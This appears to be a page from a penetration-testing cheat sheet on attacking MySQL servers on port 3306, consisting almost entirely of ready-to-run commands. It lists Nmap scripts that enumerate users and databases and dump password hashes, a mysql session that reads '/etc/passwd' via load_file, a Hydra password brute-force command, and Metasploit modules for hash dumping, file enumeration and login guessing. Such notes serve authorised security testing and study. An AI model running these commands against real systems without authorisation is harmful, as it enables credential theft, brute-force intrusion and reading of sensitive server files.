---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: false
---

# 3306 - MySQL

## Nmap Scripts

```bash
# Enum version/info/capabilities/attribute MySQ
sudo nmap -p3306 --script=mysql-info $IP

# Enum empty password/anonymous login
sudo nmap -p3306 --script=mysql-empty-password $IP

# Enum MySQL audit with AUTHENTICATION
sudo nmap -p3306 --script=mysql-audit --script-args "mysql-audit.username='administrator',mysql-audit.password='password123',mysql-audit.filename='/usr/share/nmap/nselib/data/mysql-cis.audit'" $IP

# Enum users with AUTHENTICATION
sudo nmap -p3306 --script=mysql-users --script-args "mysqluser='administrator',mysqlpass='password123'" $IP

# Enum databases with AUTHENTICATION
sudo nmap -p3306 --script=mysql-databases --script-args "mysqluser='administrator',mysqlpass='password123'" $IP

# Enum all variables with AUTHENTICATION
sudo nmap -p3306 --script=mysql-variables --script-args "mysqluser='administrator',mysqlpass='password123'" $IP

# Dump hashes with AUTHENTICATION
sudo nmap -p3306 --script=mysql-dump-hashes --script-args "username='administrator',password='password123'" $IP

# Query database with AUTHENTICATION
sudo nmap -p3306 --script=mysql-query --script-args "query='select count(*) from books.authors;',username='administrator',password='password123'" $IP
```

## MySQL tool

```bash
# Login to MySQL (password prompt)
mysql -h $IP -u administrator
    [none]> show databases;
    [none]> use <database>;
    [database]> show tables;
    [database]> show columns from <table>;
    [database]> select * from <table>;
    [database]> select load_file("/etc/passwd");
```

## Hydra

```bash
hydra -l "administrator" -P /wordlists/passwords.txt $IP mysql
```

## MSFconsole

```bash
auxiliary/scanner/mysql/mysql_version
auxiliary/scanner/mysql/mysql_schemadump
auxiliary/scanner/mysql/mysql_writeable_dirs
auxiliary/scanner/mysql/mysql_file_enum #check readable files
auxiliary/scanner/mysql/mysql_hashdump
auxiliary/scanner/mysql/mysql_login

# Require AUTHENTICATION
auxiliary/admin/mysql/mysql_enum
auxiliary/admin/mysql/mysql_sql
```
